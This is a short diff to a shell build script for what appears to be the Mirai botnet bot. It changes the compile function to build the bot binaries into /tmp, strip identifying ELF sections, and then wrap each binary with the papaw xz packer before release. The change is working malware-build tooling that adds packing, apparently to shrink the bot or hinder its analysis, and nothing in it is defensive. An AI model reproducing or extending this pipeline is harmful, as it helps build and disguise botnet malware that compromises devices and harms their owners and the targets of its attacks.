@@ -3,8 +3,11 @@
 FLAGS=""
 
 function compile_bot {
-    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
-    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
+    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o /tmp/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
+    "$1-strip" /tmp/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
+    "$1-gcc" "$3" -Ipapaw -Ipapaw/xz-embedded/userspace -Ipapaw/xz-embedded/linux/include/linux -Os -fomit-frame-pointer -ffunction-sections -fdata-sections -fmerge-all-constants -Wl,--gc-sections -Wl,--sort-common -DHAVE_MPROTECT -DHAVE_MLOCK -DHAVE_TRUNCATE -fvisibility=hidden -DPAPAW_XZ -DPAPAW_PREFIX=\"/tmp\" papaw/papaw.c -o /tmp/papaw.$1
+    "$1-strip" /tmp/papaw.$1 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
+    ./papaw/papawify /tmp/papaw.$1 /tmp/"$2" release/"$2"
 }
 
 if [ $# == 2 ]; then
